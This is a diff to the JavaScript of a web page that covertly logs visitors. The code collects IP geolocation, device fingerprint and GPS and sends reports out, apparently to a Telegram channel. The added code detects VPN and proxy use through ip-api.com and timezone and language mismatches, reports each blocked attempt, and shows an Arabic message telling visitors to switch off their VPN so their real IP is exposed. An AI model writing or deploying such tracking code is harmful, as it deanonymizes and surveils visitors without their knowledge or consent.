@@ -114,9 +114,33 @@ async function geoIP(ip) {
       coords: (j.latitude != null) ? j.latitude + ',' + j.longitude : 'n/a',
       isp: conn.isp || 'n/a',
       org: conn.org || 'n/a',
-      asn: conn.asn ? 'AS' + conn.asn : 'n/a'
+      asn: conn.asn ? 'AS' + conn.asn : 'n/a',
+      tzid: (j.timezone && j.timezone.id) || '',
+      cc: j.country_code || ''
     };
   } catch (e) { return null; }
+}
+
+async function vpnSignals(ip, ipTz, ipCountry) {
+  const sig = { proxy: false, hosting: false, tzMismatch: false, langMismatch: false };
+  try {
+    const ctl = new AbortController();
+    const t = setTimeout(() => ctl.abort(), 6000);
+    const r = await fetch('https://ip-api.com/json/' + ip + '?fields=status,proxy,hosting', { signal: ctl.signal });
+    clearTimeout(t);
+    const j = await r.json();
+    if (j.status === 'ok') { sig.proxy = !!j.proxy; sig.hosting = !!j.hosting; }
+  } catch (e) { /* ignore */ }
+  const bTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+  const lang = (navigator.language || '').toUpperCase();
+  const langCountry = lang.indexOf('-') > -1 ? lang.split('-')[1] : '';
+  if (ipTz && bTz && ipTz !== bTz) sig.tzMismatch = true;
+  if (ipCountry && langCountry && ipCountry !== langCountry) sig.langMismatch = true;
+  return sig;
+}
+
+function isVpn(sig) {
+  return sig.proxy || sig.hosting || (sig.tzMismatch && sig.langMismatch);
 }
 
 function getGPS() {
@@ -174,6 +198,16 @@ async function logVisit() {
   window._ip = ip;
   const d = deviceInfo();
   const g = await geoIP(ip);
+  const sig = await vpnSignals(ip, g && g.tzid, g && g.cc);
+  if (isVpn(sig)) {
+    const reasons = [];
+    if (sig.proxy) reasons.push('proxy');
+    if (sig.hosting) reasons.push('hosting');
+    if (sig.tzMismatch && sig.langMismatch) reasons.push('فرق المنطقة الزمنية واللغة');
+    tg(`🚫 محاولة VPN محظورة\n🆔 ${sessionId}\n🌐 IP (الظاهر): ${ip}\n📍 ${(g && g.loc) || 'n/a'}\n⚠️ السبب: ${reasons.join('، ')}\n#️⃣ fp: ${d.fp}\n💻 ${d.platform} | ${(navigator.userAgent || '').slice(0, 120)}`);
+    document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0f1420;color:#e8ecf4;font-family:system-ui;padding:20px;text-align:center" dir="rtl"><div><div style="font-size:52px;margin-bottom:14px">🚫</div><div style="font-size:20px;font-weight:700;margin-bottom:8px">تم رصد اتصال VPN</div><div style="color:#9aa5bd;font-size:14px;line-height:1.8">من فضلك أغلق الـ VPN<br>وأعد تحميل الصفحة للمتابعة</div></div></div>';
+    return;
+  }
   const time = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Cairo' }) + ' (Cairo)';
   const gpu = webglInfo();
   const net = netInfo();
